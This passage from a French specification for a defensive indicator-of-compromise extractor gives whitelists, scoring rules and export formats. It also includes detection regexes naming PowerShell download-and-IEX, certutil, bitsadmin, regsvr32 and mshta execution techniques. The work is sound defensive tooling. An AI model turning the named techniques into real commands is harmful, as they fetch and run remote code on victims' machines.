    # CDN / Infrastructure
    "cloudflare.com", "cloudflare.net", "akamai.net", "akamaiedge.net",
    "akamaized.net", "fastly.net", "fastlylb.net",
    "edgecastcdn.net", "llnwd.net", "footprint.net",
    # Apple
    "apple.com", "icloud.com", "mzstatic.com", "aaplimg.com",
    # Mozilla / Firefox
    "mozilla.org", "mozilla.com", "firefox.com",
    # Python / development
    "python.org", "pypi.org", "pythonhosted.org",
    # Linux / open source
    "ubuntu.com", "debian.org", "centos.org", "fedoraproject.org",
    "kernel.org", "gnu.org", "apache.org",
    # Security vendors (false positives communs)
    "symantec.com", "norton.com", "mcafee.com", "kaspersky.com",
    "virustotal.com", "misp-project.org",
    # TOUT le reste depuis extracteur.py
}

──────────────────────────────────────────────────────────────────────────────
18.3 — SYSTEM_MODULE_PATTERNS : Patterns de modules système (depuis extracteur.py)
──────────────────────────────────────────────────────────────────────────────

Ces patterns en regex identifient les chaînes qui RESSEMBLENT à des IOCs
mais sont en réalité des noms de modules Python, Java, .NET ou des chemins
internes de compilateurs. ESSENTIEL pour réduire les faux positifs.

SYSTEM_MODULE_PATTERNS: ClassVar[list[str]] = [
    # Python stdlib et packages courants
    r'^os\.path\.',          r'^sys\.path\.',       r'^site-packages\.',
    r'^distutils\.',         r'^setuptools\.',       r'^pip\.',
    r'^importlib\.',         r'^collections\.',      r'^itertools\.',
    r'^functools\.',         r'^pathlib\.',          r'^urllib\.',
    r'^http\.client\.',      r'^http\.server\.',     r'^email\.',
    r'^xml\.etree\.',        r'^xmlrpc\.',           r'^json\.',
    r'^logging\.',           r'^unittest\.',         r'^asyncio\.',
    r'^concurrent\.',        r'^multiprocessing\.',  r'^threading\.',
    r'^socket\.',            r'^ssl\.',              r'^hashlib\.',
    r'^hmac\.',              r'^base64\.',           r'^binascii\.',
    r'^struct\.',            r'^io\.',               r'^typing\.',
    r'^abc\.',               r'^dataclasses\.',      r'^enum\.',
    r'^copy\.',              r'^re\.',               r'^string\.',
    r'^textwrap\.',          r'^pprint\.',           r'^inspect\.',
    r'^traceback\.',         r'^warnings\.',         r'^contextlib\.',
    r'^weakref\.',           r'^gc\.',               r'^platform\.',
    r'^subprocess\.',        r'^shutil\.',           r'^tempfile\.',
    r'^fnmatch\.',           r'^glob\.',             r'^stat\.',
    r'^time\.',              r'^datetime\.',         r'^calendar\.',
    r'^math\.',              r'^random\.',           r'^statistics\.',
    r'^decimal\.',           r'^fractions\.',        r'^numbers\.',
    r'^array\.',             r'^queue\.',            r'^heapq\.',
    r'^bisect\.',            r'^pickle\.',           r'^shelve\.',
    r'^sqlite3\.',           r'^csv\.',              r'^configparser\.',
    r'^argparse\.',          r'^getopt\.',           r'^optparse\.',
    r'^getpass\.',           r'^readline\.',         r'^rlcompleter\.',
    r'^code\.',              r'^codeop\.',           r'^pdb\.',
    r'^profile\.',           r'^timeit\.',           r'^trace\.',
    r'^linecache\.',         r'^tokenize\.',         r'^token\.',
    r'^ast\.',               r'^dis\.',              r'^py_compile\.',
    r'^compileall\.',        r'^zipimport\.',        r'^zipfile\.',
    r'^tarfile\.',           r'^gzip\.',             r'^bz2\.',
    r'^lzma\.',              r'^zlib\.',             r'^zlib\.',
    # Java packages
    r'^java\.',              r'^javax\.',            r'^org\.apache\.',
    r'^org\.springframework\.', r'^com\.google\.',  r'^org\.junit\.',
    r'^com\.fasterxml\.',    r'^io\.netty\.',        r'^org\.slf4j\.',
    r'^ch\.qos\.',           r'^org\.hibernate\.',
    # .NET / C# namespaces
    r'^System\.',            r'^Microsoft\.',        r'^Windows\.',
    r'^mscorlib\.',          r'^netstandard\.',
    # C runtime et bibliothèques système
    r'^msvcr\d+\.',          r'^msvcp\d+\.',         r'^vcruntime\.',
    r'^ucrtbase\.',          r'^api-ms-win-',        r'^ext-ms-win-',
    # Compilateurs et outils
    r'^GCC:',                r'^LLVM ',              r'^clang ',
    r'^__GNUC__',            r'^_POSIX_',
    # TOUT le reste depuis extracteur.py
]

──────────────────────────────────────────────────────────────────────────────
18.4 — BINARY_SECTION_PATTERNS : Faux positifs binaires (depuis extracteur.py)
──────────────────────────────────────────────────────────────────────────────

BINARY_SECTION_PATTERNS: ClassVar[list[str]] = [
    # Sections PE standard
    r'^\.(text|data|rdata|bss|idata|edata|pdata|reloc|rsrc|tls)$',
    r'^\.(debug|didat|sxdata|gfids|gehcont|00cfg)$',
    r'^(CODE|DATA|BSS|.icode|.ocode)$',
    # Sections de runtime .NET
    r'^\.(sdata|sdatab|srdata)$',
    r'^(\.CLR_UEF|\.managed)$',
    # Sections MinGW / GCC
    r'^\.(CRT\$|ctors|dtors|eh_fram|gcc_exc).*',
    r'^(\.rdata\$|\.data\$|\.text\$).*',
    # Sections Delphi
    r'^(CODE|DATA|BSS|\.itext|\.didata)$',
    # TOUT le reste depuis extracteur.py
]

──────────────────────────────────────────────────────────────────────────────
18.5 — FILE_EXTENSIONS : Extensions fichiers à filtrer des domaines
──────────────────────────────────────────────────────────────────────────────

FILE_EXTENSIONS: ClassVar[set[str]] = {
    # Images
    "png", "jpg", "jpeg", "gif", "bmp", "ico", "svg", "webp", "tiff",
    # Fonts
    "woff", "woff2", "ttf", "otf", "eot",
    # Documents
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    # Archives
    "zip", "tar", "gz", "rar", "7z", "bz2",
    # Médias
    "mp3", "mp4", "avi", "mov", "mkv", "flv", "wav",
    # Web
    "css", "js", "html", "htm", "xml", "json", "wasm",
    # Code / config
    "py", "java", "cs", "cpp", "c", "h", "rs", "go", "yaml", "toml",
    # Binaires
    "exe", "dll", "so", "dylib", "bin", "dat",
    # TOUT le reste depuis extracteur.py
}

════════════════════════════════════════════════════════════════════════════════
SECTION 19 — SPÉCIFICATIONS DÉTAILLÉES DES PATTERNS REGEX
════════════════════════════════════════════════════════════════════════════════

Porter EXACTEMENT depuis extracteur.py. Ces patterns sont le résultat d'un
affinage empirique sur des rapports CTI réels. Ne pas les "améliorer" sans
validation préalable — les faux positifs/négatifs ont été calibrés.

──────────────────────────────────────────────────────────────────────────────
19.1 — Patterns réseau
──────────────────────────────────────────────────────────────────────────────

# IPv4 : éviter les collisions avec les hashes et les versions logicielles
IPV4_RE = re.compile(
    r'(?<![.\d])(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
    r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?![.\d])'
)

# IPv6 : toutes les formes (complète, abrégée, ::1, ::ffff:x.x.x.x)
IPV6_RE = re.compile(
    r'(?:'
    r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|'                # 1:2:3:4:5:6:7:8
    r'(?:[0-9a-fA-F]{1,4}:){1,7}:|'                               # 1::
    r'(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|'             # 1::8
    r'(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|'   # 1::7:8
    r'(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|'   # 1::6:7:8
    r'(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|'   # 1::5:6:7:8
    r'(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|'   # 1::4:5:6:7:8
    r'[0-9a-fA-F]{1,4}:(?::[0-9a-fA-F]{1,4}){1,6}|'             # 1::3:4:5:6:7:8
    r':(?::[0-9a-fA-F]{1,4}){1,7}|::|'                            # ::1 ou ::
    r'fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]+|'            # fe80::1%eth0
    r'::(?:ffff(?::0{1,4})?:)?(?:25[0-5]|2[0-4]\d|[01]?\d\d?)'  # ::ffff:192.168.1.1
    r'(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}'
    r')'
)

# Domaine FQDN avec validation TLD intégrée
DOMAIN_RE = re.compile(
    r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)'
    r'+[a-zA-Z]{2,24}\b'
)

# URLs (HTTP, HTTPS, FTP, inclut les URLs défangées)
URL_RE = re.compile(
    r'(?:https?|ftp|hxxps?|hxtp)(?:://|\[://\])'
    r'[^\s\'"<>{}\[\]|\\^`\x00-\x1f\x7f-\xff]{4,}',
    re.IGNORECASE
)

# Email
EMAIL_RE = re.compile(
    r'\b[a-zA-Z0-9._%+\-]{1,64}'
    r'(?:@|\[@\]|\[at\])'
    r'[a-zA-Z0-9.\-]{1,255}'
    r'\.[a-zA-Z]{2,24}\b'
)

──────────────────────────────────────────────────────────────────────────────
19.2 — Patterns de hachage
──────────────────────────────────────────────────────────────────────────────

# MD5 : exactement 32 hex, pas collant avec SHA256
MD5_RE = re.compile(r'(?<![0-9a-fA-F])[0-9a-fA-F]{32}(?![0-9a-fA-F])')

# SHA1 : exactement 40 hex
SHA1_RE = re.compile(r'(?<![0-9a-fA-F])[0-9a-fA-F]{40}(?![0-9a-fA-F])')

# SHA256 : exactement 64 hex
SHA256_RE = re.compile(r'(?<![0-9a-fA-F])[0-9a-fA-F]{64}(?![0-9a-fA-F])')

# SSDEEP : format blocksize:hash1:hash2
SSDEEP_RE = re.compile(
    r'\b\d{1,7}:[A-Za-z0-9/+]{6,}:[A-Za-z0-9/+]{6,}(?:,[^\n\r]*)?\b'
)

# IMPHASH : précédé du mot "imphash" (insensible à la casse)
IMPHASH_RE = re.compile(
    r'(?i)(?:imphash|import.?hash)[:\s="\']+'
    r'([0-9a-fA-F]{32})\b'
)

──────────────────────────────────────────────────────────────────────────────
19.3 — Patterns système hôte
──────────────────────────────────────────────────────────────────────────────

# Chemins Windows (chemins absolus et relatifs avec variables d'env)
FILEPATH_WIN_RE = re.compile(
    r'(?:'
    r'[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n\x00-\x1f]{1,255}\\)*'
    r'[^\\\/:*?"<>|\r\n\x00-\x1f]{1,255}|'
    r'\\\\[^\\\/:*?"<>|\r\n\x00-\x1f]{1,255}\\[^\\\/:*?"<>|\r\n\x00-\x1f]+'
    r'(?:\\[^\\\/:*?"<>|\r\n\x00-\x1f]+)*|'
    r'%(?:APPDATA|LOCALAPPDATA|TEMP|TMP|SYSTEMROOT|WINDIR|PROGRAMFILES'
    r'|PROGRAMFILES\(X86\)|COMMONPROGRAMFILES|USERPROFILE|ALLUSERSPROFILE'
    r'|PUBLIC|SYSTEMDRIVE)%'
    r'\\[^\\\/:*?"<>|\r\n\x00-\x1f]+'
    r'(?:\\[^\\\/:*?"<>|\r\n\x00-\x1f]+)*'
    r')'
)

# Chemins Unix (absolus dans répertoires suspects)
FILEPATH_UNIX_RE = re.compile(
    r'/(?:tmp|proc|dev/shm|var/tmp|run|home/[^/\s]+|root)'
    r'/[^\s\'"<>|*?\x00-\x1f\x7f]+'
)

# Clés de registre Windows
REGISTRY_RE = re.compile(
    r'(?:'
    r'HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS'
    r'|CURRENT_CONFIG|PERFORMANCE_DATA)|'
    r'HK(?:LM|CU|CR|U|CC)'
    r')'
    r'\\[^\n\r\'"<>|*?\x00-\x1f\x7f]{3,512}',
    re.IGNORECASE
)

# Mutex (noms suspects avec préfixes communs ou longueur spécifique)
MUTEX_RE = re.compile(
    r'(?:'
    r'(?:Global\\|Local\\)[A-Za-z0-9_\-\.]{4,128}|'
    r'[A-Za-z0-9_\-\.]{8,64}(?:Mutex|Lock|Sync|Guard|Semaphore|Event)'
    r')',
    re.IGNORECASE
)

──────────────────────────────────────────────────────────────────────────────
19.4 — Patterns de commandes suspectes
──────────────────────────────────────────────────────────────────────────────

# PowerShell encodé (-EncodedCommand ou -enc)
POWERSHELL_ENCODED_RE = re.compile(
    r'(?:powershell|pwsh)(?:\.exe)?'
    r'(?:\s+-\w+)*\s+'
    r'-[eE](?:ncoded[cC]ommand|nc|nco|ncod|ncode|ncoded)?\s+'
    r'([A-Za-z0-9+/=]{20,})',
    re.IGNORECASE
)

# PowerShell DownloadString / DownloadFile
POWERSHELL_DOWNLOAD_RE = re.compile(
    r'(?:New-Object\s+)?(?:System\.)?Net\.WebClient\)'
    r'\.(?:DownloadString|DownloadFile|DownloadData)'
    r'\(["\']([^"\']+)["\']',
    re.IGNORECASE
)

# Invoke-Expression / IEX
INVOKE_EXPR_RE = re.compile(
    r'(?:Invoke-Expression|IEX)\s*\(',
    re.IGNORECASE
)

# certutil : decode, encode, urlcache
CERTUTIL_RE = re.compile(
    r'certutil(?:\.exe)?\s+'
    r'(?:-\w+\s+)*'
    r'-(?:decode|encode|urlcache|verifyctl)\s+'
    r'([^\s\'"]{4,512})',
    re.IGNORECASE
)

# bitsadmin : transfer, addfile, create
BITSADMIN_RE = re.compile(
    r'bitsadmin(?:\.exe)?\s+'
    r'(?:/\w+\s+)*'
    r'/(?:transfer|addfile|create)\s+'
    r'([^\s\'"]{4,512})',
    re.IGNORECASE
)

# regsvr32 : exécution de DLL depuis URL (T1218.010)
REGSVR32_RE = re.compile(
    r'regsvr32(?:\.exe)?\s+'
    r'(?:/[suinUINk]\s+)*'
    r'(?:/i:)?(?:https?|ftp|\\\\)[^\s\'"]{4,512}',
    re.IGNORECASE
)

# mshta : exécution VBScript/JScript depuis URL (T1218.005)
MSHTA_RE = re.compile(
    r'mshta(?:\.exe)?\s+'
    r'(?:vbscript:|javascript:)?'
    r'(?:https?://)?[^\s\'"]{4,512}',
    re.IGNORECASE
)

# wmic : exécution de process
WMIC_PROCESS_RE = re.compile(
    r'wmic(?:\.exe)?\s+'
    r'(?:node:[^\s]+\s+)?'
    r'process\s+(?:call\s+create|create)\s+'
    r'["\']?([^"\';\n\r]{4,512})',
    re.IGNORECASE
)

# rundll32 : exécution de fonction DLL
RUNDLL32_RE = re.compile(
    r'rundll32(?:\.exe)?\s+'
    r'([^\s,\'"]{4,512})',
    re.IGNORECASE
)

════════════════════════════════════════════════════════════════════════════════
SECTION 20 — SPÉCIFICATIONS DU SCORING : RÈGLES COMPLÈTES
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
20.1 — Implémentation complète de IOCScorer.score()
──────────────────────────────────────────────────────────────────────────────

def score(
    self,
    raw_ioc: RawIOC,
    context: ExtractionContext,
) -> tuple[int, list[str]]:
    """
    Calcule le score de confiance et l'audit trail pour un RawIOC.

    Args:
        raw_ioc: L'IOC brut à scorer.
        context: Le contexte global de l'analyse.

    Returns:
        Tuple (score_0_100, reasons) où reasons est une liste de strings
        lisibles expliquant chaque bonus/malus appliqué.
    """
    score = self.BASE_SCORE  # 30
    reasons: list[str] = [f"base_score: +{self.BASE_SCORE}"]

    value_lower = raw_ioc.value.lower()
    ioc_type = raw_ioc.type

    # ── BONUS ──────────────────────────────────────────────────────────────

    # +20 : IOC trouvé après désobfuscation (XOR/Base64/PS decode)
    if raw_ioc.in_decoded_layer:
        score += 20
        reasons.append("+20: found in deobfuscated layer (XOR/Base64/PS)")

    # +15 : IOC dans une section PE exécutable
    if raw_ioc.section_name and raw_ioc.section_name.lower() in {
        ".text", ".code", "code", ".textbss", ".init", ".plt",
    }:
        score += 15
        reasons.append(f"+15: found in executable PE section '{raw_ioc.section_name}'")

    # +15 : IOC depuis macro VBA avec autoexec détecté
    if (raw_ioc.extraction_method == "vba_macro"
            and context.vba_autoexec_detected):
        score += 15
        reasons.append("+15: from VBA macro with autoexec trigger")

    # +12 : IP/domaine/URL dans zone haute entropie décodée
    if (ioc_type in {IOCType.IPV4, IOCType.IPV6, IOCType.DOMAIN, IOCType.URL}
            and raw_ioc.source_offset is not None
            and ContextAnalyzer.is_in_high_entropy_region(
                raw_ioc.source_offset, context.high_entropy_regions
            )):
        score += 12
        reasons.append("+12: network IOC found in high-entropy region")

    # +10 : contexte co-occurrent avec imports d'injection
    if context.import_suspicion_score >= 50:
        score += 10
        reasons.append(
            f"+10: co-occurrence with injection imports "
            f"(suspicion_score={context.import_suspicion_score})"
        )

    # +10 : IOC dans l'overlay PE
    if raw_ioc.extraction_method == "pe_overlay":
        score += 10
        reasons.append("+10: found in PE overlay (data after last section)")

    # +10 : IOC depuis VBA avec shell execution détectée
    if (raw_ioc.extraction_method == "vba_macro"
            and context.vba_shell_detected):
        score += 10
        reasons.append("+10: from VBA macro with shell execution pattern")

    # +08 : URL avec query params contenant du Base64
    if ioc_type == IOCType.URL and self._has_base64_in_url_params(raw_ioc.value):
        score += 8
        reasons.append("+8: URL with Base64-encoded query parameters")

    # +05 : TLD associé aux malwares / hébergeurs gratuits
    if ioc_type in {IOCType.DOMAIN, IOCType.URL}:
        tld = self._extract_tld(
            raw_ioc.value if ioc_type == IOCType.DOMAIN
            else self._extract_domain_from_url(raw_ioc.value)
        )
        if tld in self.SUSPECT_TLDS:
            score += 5
            reasons.append(f"+5: suspect TLD (.{tld})")

    # +05 : IP non-RFC1918, non-CDN, non-loopback (IP routable suspecte)
    if ioc_type in {IOCType.IPV4, IOCType.IPV6}:
        if not self._whitelist_filter_ref.is_rfc1918(raw_ioc.value):
            score += 5
            reasons.append("+5: routable non-RFC1918 IP address")

    # ── MALUS ──────────────────────────────────────────────────────────────

    # -30 : domaine dans la whitelist statique
    if (ioc_type in {IOCType.DOMAIN, IOCType.URL}):
        domain = (raw_ioc.value if ioc_type == IOCType.DOMAIN
                  else self._extract_domain_from_url(raw_ioc.value))
        if domain and WhitelistFilter.is_benign_domain_static(domain):
            score -= 30
            reasons.append(f"-30: domain in benign whitelist ({domain})")

    # -20 : IP RFC1918 / loopback / multicast
    if ioc_type in {IOCType.IPV4, IOCType.IPV6}:
        if self._whitelist_filter_ref.is_rfc1918(raw_ioc.value):
            score -= 20
            reasons.append("-20: RFC1918 / loopback / multicast address")

    # -15 : valeur correspondant à un module système connu
    if WhitelistFilter.is_system_module_static(raw_ioc.value):
        score -= 15
        reasons.append("-15: matches system module pattern")

    # -10 : domaine CDN connu
    if ioc_type in {IOCType.DOMAIN, IOCType.URL}:
        domain = (raw_ioc.value if ioc_type == IOCType.DOMAIN
                  else self._extract_domain_from_url(raw_ioc.value))
        if domain and domain.lower() in self.CDN_DOMAINS:
            score -= 10
            reasons.append(f"-10: CDN domain ({domain})")

    # -05 : contexte contient "version" ou "copyright" (chaîne de ressource)
    ctx_lower = raw_ioc.context_snippet.lower()
    if "version" in ctx_lower or "copyright" in ctx_lower:
        score -= 5
        reasons.append("-5: found near version/copyright string (likely resource)")

    # -05 : URL pointant vers un domaine bénin
    if ioc_type == IOCType.URL:
        domain = self._extract_domain_from_url(raw_ioc.value)
        if domain and WhitelistFilter.is_benign_domain_static(domain):
            score -= 5
            reasons.append(f"-5: URL pointing to benign domain ({domain})")

    # ── CLAMP ──────────────────────────────────────────────────────────────
    final_score = max(0, min(100, score))
    if final_score != score:
        reasons.append(f"[clamped from {score} to {final_score}]")

    return final_score, reasons

def _extract_domain_from_url(self, url: str) -> str | None:
    """
    urllib.parse.urlparse(url).netloc.lower()
    Retirer le port si présent : netloc.split(':')[0]
    """

def _extract_tld(self, domain: str) -> str:
    """domain.rsplit('.', 1)[-1].lower() si '.' dans domain sinon ''"""

def _has_base64_in_url_params(self, url: str) -> bool:
    """
    Extraire query string avec urllib.parse.urlparse(url).query
    Chercher valeurs de paramètres de longueur > 20 correspondant
    à B64_STANDARD_RE ou B64_URLSAFE_RE.
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 21 — SPÉCIFICATIONS VIRUSTOTAL : MAPPING COMPLET
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
21.1 — Endpoints VT et extraction des résultats
──────────────────────────────────────────────────────────────────────────────

async def _check_hash(self, value: str) -> VTResult:
    """
    Endpoint : GET /api/v3/files/{hash}
    Extraire depuis response["data"]["attributes"] :
    - last_analysis_stats → malicious, suspicious, undetected, harmless
    - type_description    → file_type
    - meaningful_name     → file_name
    - reputation          → reputation (int)
    - last_analysis_date  → pour information
    Construire lien VT : f"https://www.virustotal.com/gui/file/{value}"
    """

async def _check_ip(self, value: str) -> VTResult:
    """
    Endpoint : GET /api/v3/ip_addresses/{ip}
    Extraire depuis response["data"]["attributes"] :
    - last_analysis_stats → malicious, suspicious, undetected, harmless
    - country             → country (code 2 lettres)
    - as_owner            → as_owner (opérateur ASN)
    - reputation          → reputation (int)
    Construire lien VT : f"https://www.virustotal.com/gui/ip-address/{value}"
    """

async def _check_domain(self, value: str) -> VTResult:
    """
    Endpoint : GET /api/v3/domains/{domain}
    Extraire depuis response["data"]["attributes"] :
    - last_analysis_stats → malicious, suspicious, undetected, harmless
    - registrar           → stocker dans as_owner par convention
    - reputation          → reputation (int)
    - last_dns_records    → optionnel, pour info
    Construire lien VT : f"https://www.virustotal.com/gui/domain/{value}"
    """

async def _check_url(self, value: str) -> VTResult:
    """
    Encoder l'URL : url_id = base64.urlsafe_b64encode(value.encode()).decode().rstrip("=")
    Endpoint : GET /api/v3/urls/{url_id}
    Extraire depuis response["data"]["attributes"] :
    - last_analysis_stats → malicious, suspicious, undetected, harmless
    - last_final_url      → pour information
    Construire lien VT : f"https://www.virustotal.com/gui/url/{url_id}"
    """

──────────────────────────────────────────────────────────────────────────────
21.2 — Calcul du verdict VT
──────────────────────────────────────────────────────────────────────────────

def _calc_confidence(self, stats: dict) -> tuple[int, str]:
    """
    Porter depuis vt_enricher.py :
    malicious   = stats.get('malicious', 0)
    suspicious  = stats.get('suspicious', 0)
    undetected  = stats.get('undetected', 0)
    harmless    = stats.get('harmless', 0)
    total = malicious + suspicious + undetected + harmless
    if total == 0: return (0, "INCONNU")

    # Score pondéré : malicious compte double
    threat_score = ((malicious * 100) + (suspicious * 50)) / total

    # Verdict
    if malicious >= MALICIOUS_THRESHOLD:   verdict = "MALVEILLANT"
    elif malicious >= 1 or suspicious >= 3: verdict = "SUSPECT"
    else:                                   verdict = "BÉNIN"

    return (min(100, int(threat_score)), verdict)
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 22 — SPÉCIFICATIONS OPENIOC : TEMPLATE XML COMPLET
════════════════════════════════════════════════════════════════════════════════

Le fichier XML OpenIOC 1.1 généré par OpenIOCExporter doit respecter
exactement cette structure (compatible OpenIOC Editor, MISP, Redline) :

<?xml version="1.0" encoding="utf-8" ?>
<ioc xmlns="http://schemas.mandiant.com/2010/ioc"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     id="{UUID}"
     last-modified="{ISO8601_DATETIME}">

  <short_description>ADMAP M1 — IOC Report — {filename}</short_description>
  <description>
    Automated IOC extraction report generated by ADMAP Platform M1.
    Source file : {filename}
    File size   : {filesize} bytes
    File type   : {filetype}
    SHA256      : {sha256}
    Generated   : {datetime_utc}
    Pipeline    : v3.0.0
  </description>
  <authored_by>ADMAP Platform M1 — IOC Extractor v3.0</authored_by>
  <authored_date>{ISO8601_DATETIME}</authored_date>

  <definition>
    <Indicator operator="OR" id="{UUID}">

      <!-- Un IndicatorItem par IOC -->
      <IndicatorItem id="{UUID}" condition="{is|contains}">
        <Context document="{FileItem|PortItem|...}"
                 search="{FileItem/Md5sum|...}"
                 type="mir"/>
        <Content type="string">{IOC_VALUE}</Content>
      </IndicatorItem>

    </Indicator>
  </definition>

</ioc>

Générer via xml.etree.ElementTree puis reformater avec
minidom.parseString(ET.tostring(root)).toprettyxml(indent="  ").

Supprimer la première ligne de toprettyxml (<?xml version="1.0" ?>) si elle
duplique la déclaration XML déjà présente.

════════════════════════════════════════════════════════════════════════════════
SECTION 23 — SPÉCIFICATIONS MISP : STRUCTURE JSON COMPLÈTE
════════════════════════════════════════════════════════════════════════════════

Le fichier JSON MISP généré en mode offline doit respecter exactement
cette structure (importable dans toute instance MISP via
Event Actions → Import from... → MISP JSON) :

{
  "Event": {
    "info": "ADMAP M1 IOC Extraction — {filename} — {date_YYYY-MM-DD}",
    "date": "{YYYY-MM-DD}",
    "threat_level_id": "2",
    "analysis": "2",
    "distribution": "0",
    "published": false,
    "Tag": [
      {"name": "tlp:amber"},
      {"name": "type:malware-analysis"},
      {"name": "source:automated-extraction"},
      {"name": "tool:admap-m1-v3"},
      {"name": "admap:module=M1"}
    ],
    "Attribute": [
      {
        "category": "{MISP_CATEGORY}",
        "type": "{MISP_TYPE}",
        "value": "{IOC_VALUE}",
        "comment": "{COMMENT}",
        "to_ids": true,
        "distribution": "0",
        "uuid": "{UUID_v4}"
      }
    ]
  }
}

Règles spécifiques :
- to_ids = true pour tous les types sauf "text" (commandes) → to_ids = false
- distribution = "0" (organisation seulement) par défaut sécurisé
- threat_level_id : si VT verdict MALVEILLANT → "1" (High), sinon "2" (Medium)
- analysis = "2" (Completed) toujours

════════════════════════════════════════════════════════════════════════════════
SECTION 24 — INTÉGRATION ET CÂBLAGE (api/main.py détaillé)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
24.1 — Gestion des erreurs HTTP détaillée
──────────────────────────────────────────────────────────────────────────────

Mapper chaque exception custom vers le code HTTP approprié :

EXCEPTION_HTTP_MAP: dict[type, int] = {
    FileTooLargeError:         413,  # Payload Too Large
    UnsupportedFileTypeError:  415,  # Unsupported Media Type
    ValidationError:           422,  # Unprocessable Entity
    JobNotFoundError:          404,  # Not Found
    JobCancelledError:         410,  # Gone
    VTAPIKeyError:             401,  # Unauthorized (clé VT invalide)
    VTRateLimitError:          429,  # Too Many Requests
    PEParsingError:            422,  # Unprocessable Entity
    ELFParsingError:           422,
    OfficeMacroError:          422,
    ArchiveExtractionError:    422,
    ZipBombError:              413,  # Archive trop grande
    ExtractionError:           500,  # Internal Server Error
    ADMAPM1Error:              400,  # Bad Request (défaut)
}

Format de réponse d'erreur UNIFORME pour tous les endpoints :
{
  "error": "EXCEPTION_CODE",      # ex: "FILE_TOO_LARGE"
  "message": "Human readable",
  "details": {},                   # dict optionnel avec contexte
  "request_id": "uuid-v4",        # Propagé depuis middleware
  "timestamp": "ISO8601"
}

──────────────────────────────────────────────────────────────────────────────
24.2 — Middleware de logging structlog
──────────────────────────────────────────────────────────────────────────────

@app.middleware("http")
async def logging_middleware(request: Request, call_next):
    """
    1. Générer request_id = str(uuid4())[:8]  (court, lisible dans les logs)
    2. Stocker dans request.state.request_id
    3. Logger AVANT traitement :
       logger.info("request_start",
                   method=request.method,
                   path=request.url.path,
                   request_id=request_id,
                   client=request.client.host if request.client else "unknown")
    4. Mesurer duration_ms avec time.perf_counter()
    5. Appeler call_next(request)
    6. Logger APRÈS traitement :
       logger.info("request_end",
                   method=request.method,
                   path=request.url.path,
                   status_code=response.status_code,
                   duration_ms=duration_ms,
                   request_id=request_id)
    7. Ajouter header X-Request-ID à la réponse
    """

──────────────────────────────────────────────────────────────────────────────
24.3 — Lifespan et injection de dépendances
──────────────────────────────────────────────────────────────────────────────

L'application FastAPI est une FACTORY. L'instance globale est créée comme suit :

# api/main.py — fin du fichier
app = create_app()

Ceci permet :
1. Les tests d'utiliser create_app() avec des Settings de test personnalisées
2. uvicorn de pointer vers "admap_m1.api.main:app"
3. Le CLI serve de faire uvicorn.run("admap_m1.api.main:app", ...)

════════════════════════════════════════════════════════════════════════════════
SECTION 25 — README.md : CONTENU MINIMUM EXIGÉ
════════════════════════════════════════════════════════════════════════════════

Le README.md doit contenir ces sections dans cet ordre :

# ADMAP M1 — IOC Extractor v3.0

## Description
Microservice Python 3.11+ d'extraction statique d'Indicateurs de
Compromission (IOC) depuis binaires PE/ELF, documents Office, archives
et rapports CTI texte. Composant M1 de la plateforme ADMAP.

## Périmètre (ce que ce module fait et ne fait PAS)
[Tableau clair : ✓ dans M1 / ✗ dans M2-M5]

## Installation

### Dépendances minimales (core)
pip install -e .

### Dépendances optionnelles (recommandé)
pip install -e ".[full]"

### Vérification
admap-m1 --version

## Configuration
Copier .env.example → .env
Variables ADMAP_M1_* documentées

## Usage CLI

### Analyser un fichier
admap-m1 analyze malware.exe -f stix -f misp --output-dir ./results

### Exporter un bundle existant
admap-m1 export bundle.json --format all --output-dir ./exports

### Démarrer le serveur API
admap-m1 serve --port 8000

## API REST

### Endpoints principaux
[Tableau : méthode, path, description, codes HTTP]

### Exemple cURL
curl -X POST http://localhost:8000/api/v1/analyze/text \
  -H "Content-Type: application/json" \
  -d '{"text": "C2: 185.234.100.123 evil.xyz", "options": {}}'

## Architecture
[Description des 8 packages et leur rôle]

## Tests
pytest tests/ -v
pytest tests/ --cov=admap_m1 --cov-report=html

## Intégration dans la plateforme ADMAP
M1 expose : IOCBundle (Pydantic) + API REST /api/v1/
L'API centrale ADMAP consomme M1 via POST /api/v1/analyze
et GET /api/v1/jobs/{id}/result

════════════════════════════════════════════════════════════════════════════════
SECTION 26 — CHECKLIST DE VALIDATION FINALE
════════════════════════════════════════════════════════════════════════════════

Avant de considérer l'implémentation terminée, vérifier chaque point :

□ Structure de fichiers : 55 fichiers créés dans l'ordre exact
□ pyproject.toml : entry point admap-m1 fonctionnel
□ admap-m1 --version retourne "3.0.0"
□ admap-m1 analyze --help affiche l'aide sans erreur
□ admap-m1 serve démarre uvicorn sans erreur d'import
□ GET /health retourne {"status": "ok", "version": "3.0.0"}
□ GET /ready retourne les capacités correctes
□ POST /api/v1/analyze/text avec texte IOC retourne IOCBundle
□ GET /api/v1/analyze/formats liste tous les IOCType
□ pytest tests/unit/ → 100% passage sans dépendances optionnelles
□ pytest tests/integration/ → passage avec moteur minimal
□ Aucun input() dans aucun fichier (grep -r "input(" admap_m1/)
□ Aucun print() hors cli/main.py (grep -r "^print(" admap_m1/)
□ Aucune référence à YARA (génération), PCAP, Scapy (grep -r "yara\|scapy\|pcap" admap_m1/)
